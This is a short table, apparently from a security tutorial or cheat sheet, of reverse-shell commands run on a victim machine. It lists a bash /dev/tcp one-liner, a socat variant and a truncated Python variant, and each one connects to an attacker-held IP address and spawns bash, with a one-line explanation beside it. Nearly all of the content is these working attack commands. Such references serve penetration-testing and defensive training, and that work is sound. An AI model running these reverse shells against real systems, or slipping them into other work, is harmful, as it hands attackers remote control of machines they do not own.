
|Command on the Victim|Explanation|
|---|---|
|`bash -i >& /dev/tcp/10.10.10.10/1337 0>&1`|The victim is forced to connect to 10.10.10.10:1337 and launch "bash" for the attacker.|
|`socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane`|Socat alternative to the above command. The attacker is listening at 10.20.20.20:2525.|
|`python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'`|Python alternative to the above command. The attacker is listening at 10.30.30.30:80.|
